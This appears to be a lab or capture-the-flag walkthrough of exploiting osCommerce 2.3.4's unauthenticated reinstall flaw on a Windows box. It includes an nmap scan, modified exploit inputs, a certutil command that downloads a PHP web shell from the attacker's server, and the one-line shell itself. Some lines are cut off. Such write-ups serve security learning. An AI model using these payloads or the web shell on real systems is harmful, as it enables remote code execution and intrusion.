#Windows # #


**NMAP Scan**

```sh
  nmap -sV -sC -p- 10.10.83.191
  ```

- To see the versions of the services running (**-sV**)
- To perform a script scan using the default set of scripts (**-sC**)
- To scan all ports from 1 through 65535 (**-p-**)


 Open Ports

* ?
* ?

Port 8080/tcp is open, it takes us to the following website.


![image](https://user-images.githubusercontent.com/99097743/170898695-0f88913c-e395-43be-a7f8-ded690c878f7.png)

OSCommerce is an e-commerce and online store-management software program

(Ref: https://en.wikipedia.org/wiki/OsCommerce)



A quick **serchsploit** search on **osCommerce 2.3.4** shows the following vulnerabilities:

![image](https://user-images.githubusercontent.com/99097743/170889834-7bc4cd09-df46-41b0-ac76-48e7dc3e57ae.png)

**Exploit title: osCommerce 2.3.4.1 - Remote Code Execution (PATH: php/webapps/44374.py)**

* It is an interesting exploit as it does not require credentials.
* An unauthorized attacker can reinstall, ff installation directory has not been removed.  
* During the reinstallation process, OS commerce does not attempt to do any authentication, it simple executes the code. 

We need to update the followings inputs:

1) base_url: base_url = "http://10.10.83.191:8080/oscommerce-2.3.4/catalog/"
2) target_url: target_url = "http://10.10.83.191:8080/oscommerce-2.3.4/catalog/install/install>
3) Payload: payload += 'exec("certutil.exe -urlcache -f 10.10.83.191:8080/shell.php shell.p>


![image](https://user-images.githubusercontent.com/99097743/170901248-239aad25-20dc-48a4-9e8d-b17b2190bffe.png)

We need to launch the exploit:

```sh
  python ./44374_modified.py
  ```

  ![image](https://user-images.githubusercontent.com/99097743/170891095-908551f8-3745-40a3-b618-8c2f0616985f.png)  
  This message means our code is injected but we need open the URL above in our browser to execute the code:
  
  ![image](https://user-images.githubusercontent.com/99097743/170891198-c029d698-81fc-4f52-bdf8-0db9b12d0dd4.png)

  
  We can follow the steps below to check the output:
  
  1) Change the paylod in the python script to a ping command for the localhost: **payload += 'exec("ping 10.18.123.93");'**
  2) Open a tcpump session and capture the ICMP packages: **sudo tcpdump -i tun0 icmp**


Great, the code is successfully getting executed! Now we need to work on the actual SHELL.PHP payload

Here are the steps -- Please see the picture below for a visual illustration:

1) Generate a simple web shell in localhost: 

```sh
<?php echo shell_exec($_GET["cmd"]); ?>
```

2) Transfer PHP payload through an HTTP server 

```sh
'exec("certutil.exe -urlcache -f http://10.18.123.93:8000/shell.php shell.php");'
```

3) Refresh the browser and trigger the process. 

![Screenshot 2022-05-29 215707](https://user-images.githubusercontent.com/99097743/170910606-a77516e1-d2b4-4451-9e6f-f0e397f16a54.png)


